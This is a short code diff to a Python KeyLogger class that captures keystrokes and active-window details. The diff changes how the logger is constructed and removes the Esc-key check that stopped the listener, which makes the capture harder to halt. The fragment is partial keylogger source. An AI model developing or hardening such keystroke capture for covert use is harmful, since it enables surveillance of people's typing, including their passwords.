@@ -9,7 +9,7 @@ class KeyLogger:
     def __init__(self, filename: str = "log.txt"):
         self.filename = filename
 
-        self.logger = Logger(filename = filename)
+        self.logger = Logger()
 
         self.char_keys = None
         self.other_keys = None
@@ -60,7 +60,7 @@ class KeyLogger:
                 self.previous_win_info = win_info
                 self.prev_control = control
                 return
-            
+
             
 
             self.char_keys += key
@@ -116,8 +116,6 @@ class KeyLogger:
         #     self._current_keys.discard(key)
 
         log(f"Keyboard: Key released -> {key}")
-        if key == keyboard.Key.esc:
-            return False  # stop listener
        
   
         
